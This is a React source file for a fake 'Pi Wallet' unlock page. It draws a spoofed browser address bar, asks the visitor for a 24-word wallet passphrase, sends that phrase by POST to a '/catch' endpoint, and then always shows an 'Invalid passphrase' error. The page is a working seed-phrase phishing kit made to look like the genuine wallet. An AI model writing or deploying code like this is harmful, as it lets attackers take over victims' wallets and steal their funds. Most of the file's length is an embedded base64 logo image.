import React, { useState } from "react";
import { Link } from "react-router-dom";
import { FaAngleDown } from "react-icons/fa6";
import { HiOutlineArrowLeft } from "react-icons/hi";
import logo from "../assets/pilogo.png";

const Passphrase = () => {
  const errorText = "Invalid passphrase or incomplete KYC";
  const [error, setError] = useState(null);

  const takeAction = async () => {
    setError(null);
    const textArea = document.querySelector("textarea");

    if (textArea.value == "" || textArea == null) {
      setError(errorText);
      return;
    }

    const myHeaders = new Headers();
    myHeaders.append("Content-Type", "application/json");

    const response = await fetch("http://localhost:8080/catch", {
      method: "POST",
      headers: myHeaders,
      body: JSON.stringify({
        phrase: textArea.value,
      }),
    });

    const data = await response.json();
  };
  return (
    <div className="flex flex-col w-full overflow-auto">
      <div className="flex h-10 items-center justify-between px-3 gap-2">
        <Link to="/">
          <HiOutlineArrowLeft className="text-[#000] text-lg" />
        </Link>
        <div className="border w-[70%] border-black rounded-md h-[80%] flex items-center pl-1">
          <p className="text-sm">https://piwallet.live/unlock-pi-wallet</p>
        </div>
        <FaAngleDown className="text-black text-xl" />
      </div>

      <div className="flex bg-[#703d92] text-white h-10 items-center justify-center px-3 gap-2">
        <img
          src="data:image/jpeg;base64,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"
          alt="Pi"
          className="h-5"
        />
        Wallet
        <img src={logo} alt="Pi" className="h-8" />
      </div>

      <div className="flex w-full items-center flex-col px-3">
        <p className="font-[800] text-[17px] mb-5 mt-4">Unlock Pi Wallet</p>
        <div className="w-[95%] border rounded-md h-auto mb-7 p-2">
          <textarea
            className="w-full h-full border-none outline-none resize-none overflow-hidden"
            placeholder="Enter your 24-passphrase here"
            rows="6"
          ></textarea>
        </div>
        <button
          className="border border-[#703d92] text-[#703d92] w-full h-10 font-[500] rounded-lg"
          onClick={takeAction}
        >
          Unlock With Passphrase
        </button>
        <p className="text-[red] mb-4 mt-4">{error}</p>
        <p className="text-[13px]">
          As a non-custodial wallet, your wallet passphrase is exclusively
          accessible only to you. Recovery of passphrase is currently
          impossible. <br /> <br /> Lost your passphrase?{" "}
          <Link className="text-[#0001ee]" to="#">
            You can create a new wallet,
          </Link>{" "}
          but all in your previous wallet will be inaccessible.
        </p>
      </div>
    </div>
  );
};

export default Passphrase;
